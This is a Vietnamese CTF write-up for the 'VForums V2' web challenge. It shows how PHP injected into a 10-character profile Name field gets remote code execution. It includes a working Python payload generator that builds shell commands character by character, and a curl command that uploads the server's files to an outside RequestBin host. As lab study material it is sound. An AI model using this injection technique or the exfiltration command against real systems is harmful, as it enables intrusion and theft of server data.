## VForums V2
### 200 points

Bài này thì mình thấy khá là nghệ thuật, biết được đâm vào đâu thì không khó, mà biết đâm vào như nào mới khó.

### Đề bài
<pre>
<a href="http://35.240.153.120:8002">http://35.240.153.120:8002</a>
</pre>

### Giao diện của bài:

Nhiều bài chỉ có mỗi trang login thế này trông hơi bùn, nhưng biết làm sao

![view-login]

### Lời giải

Như thường lệ, mình vẫn tạo tài khoản, đăng nhập thử và đi dạo vài tính năng xem có gì thú vị

Thì thấy khi update `Name` ở đây

![view-update-info]

Thì bên `Logs` sẽ có thêm một dòng như này

![view-logs]

Thử update đổi `Name` thành `<??>`, thấy name trong `Logs` biến mất, biết ngay là nó thực thi đoạn php đó rồi 

![[view-injected]

Tuy nhiên khi mình thử update `Name` thành một đoạn php dài hơn thì bị báo chỉ được sử dụng 10 chars thôi :'(

![view-10-chars]

Vậy mục tiêu ở đây là phải viết được cái command làm sao để RCE được nhưng vẫn tuân thủ điều kiện 10 chars của bài

Sau khi lục lọi trên mạng một lúc thì mình tìm được 2 shorthand commands cực hữu ích, đó là `<?=$variable?>` thay cho `echo $variable`, và `` `{$variable}` `` thay cho `exec($variable)`.

Thử lệnh `<?=`ls`?>` (10 chars) ta được kết quả

![view-ls]

Sau đó, vì nhận thấy rằng phép gán biến, ví dụ `<?$a="b"?>` hết 10 chars, phép nối biến, ví dụ `<?$a.=$b?>` hết 10 chars, kèm thêm lệnh exec, ví dụ `` <?`{$a}`?> ``, cũng hết 10 chars,
 nên 3 lệnh này đều có thể sử dụng làm bàn đạp để RCE.
 
Tuy nhiên ở đây có một vấn đề đó là vì không chèn thêm được `=` vào trong các lệnh này nên mình không echo được kết quả ra. Vì vậy mình chọn phương án `cat *` các file trong thư mục đó ra và gửi lên `RequestBin`. Bạn có thể tạo một file shell nho nhỏ trên server để chạy lệnh và echo ra cho tiện, tuy nhiên kia là cách mình xử lý trong lúc làm bài. Mình viết một đoạn payload generator bằng Python như sau:
```python
import requests

cookie = '<cookie>';

def gen(command):
    v = 'b'

    r = ['<?$a=""?>']
    
    for c in command:
        if (v > 'z'):
            for i in range(ord('b'), ord('z') + 1):
                r.append('<?${}.=${}?>'.format('a', chr(i)))
            v = 'b'
        r.append('<?${}="{}"?>'.format(v, c))
        v = chr(ord(v) + 1)

    for i in range(ord('b'), ord(v)):
        r.append('<?${}.=${}?>'.format('a', chr(i)))
    r.append('<?=$a?>')
    r.append('<?`{$a}`?>')
    return r

def nameChange(name):
    return requests.post('http://35.240.153.120:8002/index.php?page=profile', data = {
        'name': name
    }, headers = {
        'cookie': cookie
    })

r1 = gen('cat * > out.txt')
for c in r1:
    nameChange(c)
r = gen('curl http://requestbin.net/r/x5ev70x5 -F \'f=@out.txt\' -X POST')
for c in r:
    nameChange(c)
``` 

Kết quả, vì mình chạy update với mỗi kí tự trong payload nên sẽ có một đoạn log dài ngoằng như kia, dòng cuối cùng là payload đã nối lại, được mình echo ra, cho biết payload đã chạy thành công

![view-executed]

Việc còn lại là bới RequestBin tìm flag thôi :3

### Flag

![flag]

```
flag{0nly_10_ch4r_(T__T)}
```

[view-login]: assets/VFORUMS_V2/view-login.png
[view-update-info]: assets/VFORUMS_V2/view-update-info.png
[view-logs]: assets/VFORUMS_V2/view-logs.png
[view-injected]: assets/VFORUMS_V2/view-injected.png
[view-10-chars]: assets/VFORUMS_V2/view-10-chars.png
[view-ls]: assets/VFORUMS_V2/view-ls.png
[view-executed]: assets/VFORUMS_V2/view-executed.png
[flag]: assets/VFORUMS_V2/flag.png